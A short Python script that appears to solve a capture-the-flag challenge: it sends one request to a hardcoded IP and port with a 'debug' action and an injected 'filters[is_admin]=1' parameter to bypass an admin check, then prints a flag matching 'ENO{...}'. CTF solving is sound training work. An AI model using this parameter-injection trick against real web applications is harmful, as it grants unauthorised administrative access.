import requests
import re

TARGET_URL = 'http://52.59.124.14:10018'
def getFlag():
    params = {
        "action": "debug",
        "filters[is_admin]":"1"
    }
    response = requests.get(f"{TARGET_URL}/", params=params, verify=False)
    flag = re.findall("(ENO{.*})",response.text)
    if len(flag) > 0:
        print(flag[0])

def main():
    getFlag()

if __name__ == "__main__":
    main()